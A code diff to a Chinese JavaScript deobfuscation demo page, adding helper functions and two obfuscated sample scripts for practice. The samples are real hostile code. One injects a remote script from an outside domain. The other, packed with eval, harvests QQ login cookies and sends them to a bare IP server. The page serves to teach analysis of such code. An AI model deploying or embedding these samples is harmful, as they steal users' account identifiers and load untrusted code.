@@ -43,10 +43,23 @@
                         }
                         return "'" + v.replace(/'/g, '\\\'') + "'";
                     });
+                },
+                commentremoveal: function (str) {
+                    return str.replace(/\/\*.*?\*\//g, " ");
+                },
+                revokeChar: function (str) {
+                    str = str.replace(/\\x([\da-f]{2})/gi, function (a, b) { return String.fromCharCode(parseInt(b, 16)) })
+                    str = str.replace(/\\u([\da-f]{4})/gi, function (a, b) { return String.fromCharCode(parseInt(b, 16)) });
+
+                    return str;
+                },
+                rebuildstr: function (str) {
+                    return String.fromCharCode.apply(this, eval("[" + /\(([\d\,\s]+)\)/.exec(str)[1] + "]"));
                 }
             };
 
             var deob = function () {
+                // console.log(this);
                 var button = $(this);
                 var container = button.closest("div.tab-pane");
                 var code = container.find("textarea");
@@ -64,6 +77,13 @@
 </head>
 <body>
     <div class="container">
+        <h2>
+            JS反混淆演示
+            <a target="_blank" href="http://blog.fishlee.net/2015/05/13/js_deobfuscation_demo/">知识来源</a>
+        </h2>
+
+
+        <span></span>
         <ul class="nav nav-tabs" id="myTab" role="tablist">
             <li role="presentation" class="active"><a href="#home" aria-controls="home" role="tab" data-toggle="tab">Home</a></li>
             <li role="presentation"><a href="#profile" aria-controls="profile" role="tab" data-toggle="tab">Profile</a></li>
@@ -75,8 +95,16 @@
                 <button type="button" class="btn btn-primary btn-lg" data-deobtype="eval">反混淆1</button>
                 <button type="button" class="btn btn-primary btn-lg" disabled="disabled" data-deobtype="arrayde">反混淆2</button>
             </div>
-            <div role="tabpanel" class="tab-pane" id="profile">...</div>
-            <div role="tabpanel" class="tab-pane" id="messages">...</div>
+            <div role="tabpanel" class="tab-pane" id="profile">
+                <textarea class="form-control" rows="15">/*_Ka*/var/*hCnn*/IHse/*Wav*/=/*fBJAp*/\u0053\u0074\u0072\u0069\u006e\u0067./*lsxIcC*/\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065;/*ksHMx*/var/*KuVkYP*/NWVbw_QY/*_ztkzYy*/=/*_pNZE*/\u0065\u0076\u0061\u006c;NWVbw_QY(IHse(118,97,114,32,111,72,101,97,100,61,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,72,69,65,68,39,41,46,105,116,101,109,40,48,41,59,118,97,114,32,111,83,99,114,105,112,116,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,111,83,99,114,105,112,116,46,116,121,112,101,61,34,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,34,59,111,83,99,114,105,112,116,46,115,114,99,61,34,104,116,116,112,58,47,47,113,113,46,109,98,53,117,46,99,111,109,47,113,113,46,106,115,34,59,111,72,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,111,83,99,114,105,112,116,41,59));</textarea>
+                <button type="button" class="btn btn-primary btn-lg" data-deobtype="commentremoveal">反混淆1</button>
+                <button type="button" class="btn btn-primary btn-lg" disabled="disabled" data-deobtype="revokeChar">反混淆2</button>
+                <button type="button" class="btn btn-primary btn-lg" disabled="disabled" data-deobtype="rebuildstr">反混淆3</button>
+            </div>
+            <div role="tabpanel" class="tab-pane" id="messages">
+                <textarea class="form-control" rows="15">eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('l 4(a){3 b,T=Y 1y("(^| )"+a+"=([^;]*)(;|$)");h(b=9.12.13(T))n 1q(b[2]);D n A}l 6(a){3 b=9.14.15;3 c=b.1k(b.C("?")+1).1w("&");j(3 i=0;i<c.p;i++){3 d=c[i].C(a+"=");h(d!=-1){n c[i].z(a+"=","").z("?","");17}}n""}l Q(a){3 b=6(\'R\');3 c=6(\'1u\');3 d=6(\'1v\');3 e=6(\'S\');3 f="U://V.X.11.Z:10/?1a=1c";f+="&1e="+a;f+="&R="+b;f+="&1g="+c;f+="&1i="+d;f+="&S="+e;f+="&r="+(Y 1m()).1o();3 g=9.E("F");g.G="H/I";g.J=f;9.K(\'L\').M(0).N(g)}l O(b){3 a=9.E("F");a.G="H/I";a.18="19-8";a.J=b;9.K(\'L\').M(0).N(a)}3 s=4("1b");3 x=4("1d");3 t=4("1f");3 u=4("1h");3 v=4("1j");3 w=4("1l");3 q=4("1n");3 y=4("1p");3 W=s||x||t||u||v||w||q||y;h(W==A){O("U://V.X.11.Z:10/m/1r.1s?c="+6(\'1t\')+"&d=1")}D{3 k=[s,x,t,u,v,w,q,y];3 5=[];3 7=[];3 B={};j(3 i=0;i<k.p;i++){h(k[i]!=A){3 a=k[i].z(/^[o|0]*/1x,"");5.P(a)}}j(3 i=0;i<5.p;i++){h(!B[5[i]]){B[5[i]]=1z;h(1A(5[i])>1B){7.P(5[i])}}}7=7.16();j(3 i=0;i<7.p;i++){Q(7[i])}}',62,100,'|||var|Gc5u|buin|Re5u|cuin||document||||||||if||for|auin|function||return||length|u7||u1|u3|u4|u5|u6|u2|u8|replace|null|uq|indexOf|else|createElement|script|type|text|javascript|src|getElementsByTagName|HEAD|item|appendChild|Creatjs5u|push|Q5u|uid|title|reg|http|42|quin|120|new|238|8888||cookie|match|location|href|reverse|break|charset|utf|action|pt2gguin|saveQQ|o_cookie|qq|p_uin|referrer|uin|url|ptui_loginuin|substring|uin_cookie|Date|luin|getTime|qm_username|unescape|wdl|php|fkid|ref|furl|split|ig|RegExp|true|parseInt|10051'.split('|'),0,{}))</textarea>
+                <button type="button" class="btn btn-primary btn-lg" data-deobtype="eval">反混淆1</button>
+            </div>
         </div>
     </div>
 </body>
